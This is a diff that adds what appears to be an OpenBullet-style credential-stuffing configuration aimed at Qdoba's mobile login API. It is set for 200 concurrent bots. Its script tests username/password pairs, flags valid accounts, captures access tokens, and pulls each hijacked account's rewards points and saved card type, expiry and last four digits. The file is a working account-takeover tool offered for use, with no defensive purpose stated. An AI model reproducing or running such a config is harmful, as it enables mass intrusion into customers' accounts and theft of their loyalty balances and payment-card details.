@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "Name": "Qdoba Proxyless",
+  "SuggestedBots": 200,
+  "LastModified": "2019-07-02T19:12:05.2527801-07:00",
+  "AdditionalInfo": "",
+  "Author": "GUI",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#post_login REQUEST POST "https://prod.qdobamobile.app/api/v1/security/token" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.qdoba.com/" 
+  HEADER "BR-Client-Platform: Web" 
+  HEADER "Origin: https://www.qdoba.com" 
+  HEADER "DNT: 1" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "customerId" 
+    KEY "accessToken" 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, those credentials are invalid." 
+#parse_id PARSE "<SOURCE>" LR "customerId\":\"" "\",\"" -> VAR "id" 
+#parse_auth PARSE "<SOURCE>" LR "accessToken\":\"" "\",\"" -> VAR "auth" 
+#get_points REQUEST GET "https://prod.qdobamobile.app/api/v1/query/affinity/<id>/rewards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.qdoba.com/" 
+  HEADER "BR-Client-Platform: Web" 
+  HEADER "authToken: <auth>" 
+  HEADER "Origin: https://www.qdoba.com" 
+  HEADER "DNT: 1" 
+#parse_points PARSE "<SOURCE>" LR "currentPoints\":" ",\"" -> CAP "Points" 
+#parse_catering_points PARSE "<SOURCE>" LR "currentCateringPoints\":" ",\"" -> CAP "Catering Points" 
+#get_payment REQUEST GET "https://prod.qdobamobile.app/api/v1/query/customer/<id>/vault" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.qdoba.com/" 
+  HEADER "BR-Client-Platform: Web" 
+  HEADER "authToken: <auth>" 
+  HEADER "Origin: https://www.qdoba.com" 
+  HEADER "DNT: 1" 
+#type PARSE "<SOURCE>" LR "cardType\":\"" "\"" -> CAP "Type" 
+#exp PARSE "<SOURCE>" LR "exp\":\"" "\"" -> CAP "Exp" 
+#last4 PARSE "<SOURCE>" LR "lastFourDigit\":\"" "\"" -> CAP "Last 4:" 
